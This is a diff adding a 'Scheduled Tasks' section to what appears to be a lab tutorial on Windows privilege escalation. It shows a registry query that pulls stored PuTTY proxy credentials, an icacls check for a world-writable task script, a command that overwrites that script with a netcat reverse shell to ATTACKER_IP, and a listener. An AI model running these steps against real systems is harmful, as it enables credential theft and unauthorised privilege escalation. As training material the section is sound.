@@ -53,3 +53,45 @@ To retrieve the stored proxy credentials, you can search under the following reg
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
+
+### Scheduled Tasks
+Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
+
+Scheduled tasks can be listed from the command line using the *schtasks* command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
+
+Command Prompt
+```
+C:\> schtasks /query /tn <task-name> /fo list /v
+Folder: \
+HostName:                             hostname
+TaskName:                             \taskname
+Task To Run:                          C:\tasks\task.bat
+Run As User:                          username
+```
+You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
+
+If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
+
+Command Prompt
+```
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\task.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+```
+As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
+
+Command Prompt
+```
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\task.bat
+```
+We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
+```
+nc -lvp 4444
+```
+The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
+
+Command Prompt
+```
+C:\> schtasks /run /tn vulntask
+```
